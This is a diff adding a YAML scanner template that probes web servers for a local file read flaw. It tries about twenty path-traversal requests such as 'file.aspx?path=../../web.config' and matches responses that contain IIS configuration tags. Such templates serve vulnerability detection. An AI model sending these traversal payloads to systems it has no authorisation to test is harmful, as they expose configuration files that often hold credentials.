@@ -1,0 +1,48 @@
+id: web-config-traversal
+
+info:
+  name: Web Configuration File - Detect
+  author: reewardius
+  severity: high
+  tags: lfi,lfr,generic,asp,iis
+  reference: https://hackerone.com/reports/685344
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/file.ashx?path=web.config'
+      - '{{BaseURL}}/file.aspx?path=web.config'
+      - '{{BaseURL}}/file.asp?path=web.config'
+      - '{{BaseURL}}/file.jspx?path=web.config'
+      - '{{BaseURL}}/file.jsp?path=web.config'
+      - '{{BaseURL}}/file.ashx?path=../../web.config'
+      - '{{BaseURL}}/file.aspx?path=../../web.config'
+      - '{{BaseURL}}/file.asp?path=../../web.config'
+      - '{{BaseURL}}/file.jspx?path=../../web.config'
+      - '{{BaseURL}}/file.jsp?path=../../web.config'
+      - '{{BaseURL}}/file.ashx?path=./web.config'
+      - '{{BaseURL}}/file.aspx?path=./web.config'
+      - '{{BaseURL}}/file.asp?path=./web.config'
+      - '{{BaseURL}}/file.jspx?path=./web.config'
+      - '{{BaseURL}}/file.jsp?path=./web.config'
+      - '{{BaseURL}}/file.ashx?path=../web.config'
+      - '{{BaseURL}}/file.aspx?path=../web.config'
+      - '{{BaseURL}}/file.asp?path=../web.config'
+      - '{{BaseURL}}/file.jspx?path=../web.config'
+      - '{{BaseURL}}/file.jsp?path=../web.config'
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - <configuration>
+          - <system.webServer>
+        condition: and
+
+      - type: status
+        status:
+          - 200
+          - 206
+        condition: or
